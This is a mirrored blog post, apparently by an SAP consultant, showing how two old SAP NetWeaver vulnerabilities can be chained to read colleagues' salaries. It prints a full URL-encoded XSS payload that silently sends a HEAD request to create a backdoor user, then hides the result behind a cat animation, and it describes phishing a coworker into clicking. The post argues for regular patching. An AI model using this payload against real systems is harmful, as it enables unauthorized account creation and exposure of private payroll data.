<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>SAP security. Do you regularly install updates?</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="If you work in a Forbes 500 list company, it is highly likely that the SAP ERP HR module counts your salary. I will show how, using SAP errors, to vie...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>SAP security. Do you regularly install updates?</h1><div class="post__text post__text-html js-mediator-article"> If you work in a <a href="http://www.forbes.com/2003/03/26/500sland.html">Forbes 500</a> list company, it is highly likely that the SAP ERP HR module counts your salary.  I will show how, using SAP errors, to view someone else‚Äôs salary in the SAP ERP system. <br><br>  <b>Disclaimer</b> : This is our first official post on Habr√© (we hope not the last), and we would like to start by covering one of the most important topics.  The information in this post is solely for the purpose of reviewing and demonstrating the critical nature of security issues.  In the article we used two very old vulnerabilities.  If the system is regularly updated with patches, this scenario will not be possible. <br><a name="habracut"></a><br>  So, only HR workers have access to payroll data.  Even if you have SAP GUI access, and you try to enter the s / n data view transaction, then with a 99% probability you will be denied: <br><br><img src="https://habrastorage.org/files/e24/2ef/cbc/e242efcbc70b4022b30fa5812ed1502b.png">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      There is no access, but I want to see the salary.  We are going to watch exploits for SAP.  What tools do we have with exploits?  That's right, Metasploit.  Google  Aha, on github there is a whole daddy metasploit-framework / modules / auxiliary / scanner / sap /.  Three dozen exploits, however: <br><br><img src="https://habrastorage.org/files/38b/525/d2b/38b525d2bcda4f7bae6036389a62e413.png"><br><br>  For example, ‚ÄúAuthentication bypass using Verb Tampering‚Äù (modules / auxiliary / scanner / sap / sap_ctc_verb_tampering_user_mgmt.rb), it has already been <a href="http://habrahabr.ru/company/dsec/blog/148480/">written about</a> in Habr√©. <br><br>  Briefly, the essence of the vulnerability is that one of the admin services of the Java server included in the SAP NetWeaver delivery package is accessible by a HEAD request (as opposed to forbidden GET and POST requests).  If you open <a href="">github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb,</a> we see that the problem is in accessing the servlet: <br><br> <code>/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;CREATEUSER;USERNAME=' + datastore['USERNAME'] + ',PASSWORD=' + datastore['PASSWORD']</code> <br> <br>  Of course, we can put Metasploit and run the script from the local computer.  But: <br><br>  1. There is no access to the local network, and the service is most likely closed for access from outside <br>  2. The script will be run on your behalf. <br><br>  So come on a) create the script yourself based on the sap_ctc_verb_tampering_user_mgmt.rb code b) let us run this script to some of our colleagues using one of the XSS errors <br><br>  About XSS on Habr√© have already written many times (read once <a href="http://habrahabr.ru/post/66057/">habrahabr.ru/post/66057</a> two <a href="http://habrahabr.ru/post/197672/">habrahabr.ru/post/197672</a> ) <br><br>  Go google securityfocus.  359 results for ‚Äúsap xss exploit site: http: //www.securityfocus.com/‚Äù <br><br><img src="https://habrastorage.org/files/9f1/a64/2b9/9f1a642b9f3542c6b348b237dc8d4f6b.png"><br><br>  According to <a href="http://www.securityfocus.com/bid/15361/exploit">www.securityfocus.com/bid/15361/exploit</a> we see a request that will execute Javascript on the user's computer: <br><br> <code><a href="http://www.example.com/sap/bc/BSp/sap/menu/fameset.htm%3Fsap-sessioncmd%3Dopen%26sap-syscmd%3D%253Cscript%253Ealert"></a> www.example.com/sap/bc/BSp/sap/menu/fameset.htm?sap-sessioncmd=open&amp;sap-syscmd=%3Cscript%3Ealert('xss')%3C/script%3E <br></code> <br><br>  Instead of dummy, we insert a HEAD request to / ctc / ConfigServlet <br><br>  And in order that nobody saw the results of the query, we will show the user a picture, always with cats: <br><br><br><br>  The final link after encoding in the URL will look like this: <br><br> <code><a href="http://www.example.com/sap/bc/BSp/sap/menu/fameset.htm%3Fsap-sessioncmd%3Dopen%26sap-syscmd%3D"></a> www.example.com/sap/bc/BSp/sap/menu/fameset.htm?sap-sessioncmd=open&amp;sap-syscmd= %3Cscript%3Evar%20http%20%3D%20new%20XMLHttpRequest()%3Bhttp.open(%27HEAD%27%2C%20%22http%3A%2F%2Fxxxxx%2Fctc%2FConfigServlet%3Fparam%3Dcom.sap.ctc.util.UserConfig%3BCREATEUSER%3BUSERNAME%3Dtest444%2CPASSWORD%3DPassword01%22)%3Bhttp.send()%3Bwindow.location.href%20%3D%20%27http%3A%2F%2Fru.fishki.net%2Fpicsw%2F042007%2F02%2Fflash%2Fcat.swf%27%3B%3C%2Fscript%3E%20</code> <br> <br>  So, we make a letter to colleagues: <br><br><img src="https://habrastorage.org/files/7e3/d26/744/7e3d26744ea34af3b9add3292f8c1472.png"><br><br>  Nina Ivanovna plays a Flash-game: <br><br><img src="https://habrastorage.org/files/530/f60/8c6/530f608c6f9147739c957e7ef675b30a.png"><br><br>  And we get a user test444, which (if NetWeaver ABAP is activated as a source of users) is created not only on the NetWeaver Application Server Java server, but also in the backend - NetWeaver Application Server ABAP. <br><br><img src="https://habrastorage.org/files/f4e/abe/58c/f4eabe58c5024da08d5dbaac9ab52687.png"><br><br>  Login, check.  Transaction HR module works! <br><br><img src="https://habrastorage.org/files/205/681/41b/20568141b97d428eb731f092b535597e.png"><br><br>  <b>Findings.</b>  We exploited two vulnerabilities in 2011 and 2009.  If the system is regularly updated with patches, this scenario will not be possible.  Unfortunately, many basis servers forget to regularly drop in at <a href="http://service.sap.com/securitynotes">service.sap.com/securitynotes</a> and check compliance with the latest patches, or do it irregularly.  Since 2010, SAP has been organizing Security Patch Day every second Tuesday of every month when there is a massive release of security patches.  The SAP company asks partners not to publish and not disclose information about the found vulnerabilities for at least 3 months from the moment of the patch release.  However, our research shows that many (including large) customers do not always install updates up to 3 months. <br><br>  The author - Daniel Luzin <br>  Consulting subdivision of SAP CIS LLC <br>  Kosmodamianskaya emb.  52/7, 113054 Moscow <br>  T. +7 495 755 9800 ext.  3045 <br>  M. +7 926 452 0425 <br>  F. +7 495 755 98 01 <br><br>  <b>Update:</b> Some people did not want to read the article beyond the headline in order to understand its essence.  In order not to mislead anyone, we decided to change the title reflecting the content of the post. </div><p>Source: <a href="https://habr.com/ru/post/239553/">https://habr.com/ru/post/239553/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../239539/index.html">3D printing in the service of prosthetists</a></li>
<li><a href="../239541/index.html">Talk radio on the knee</a></li>
<li><a href="../239543/index.html">The use of neural networks in robotics: prospects and advantages</a></li>
<li><a href="../239545/index.html">Making an HTML5 quest: creating a character and basic animation</a></li>
<li><a href="../239549/index.html">Demonstration of vulnerabilities in Liqpay</a></li>
<li><a href="../239555/index.html">Intel¬Æ Parallel Studio XE 2015 - Talk About New Names and "Chips"</a></li>
<li><a href="../239557/index.html">Beetle modeling</a></li>
<li><a href="../239559/index.html">IBM invites to the conference "Infrastructure 2014"</a></li>
<li><a href="../239563/index.html">As 3 people without investment "magic button" for the stores did</a></li>
<li><a href="../239567/index.html">Hacking using search, inattention and my accomplice GitHub</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>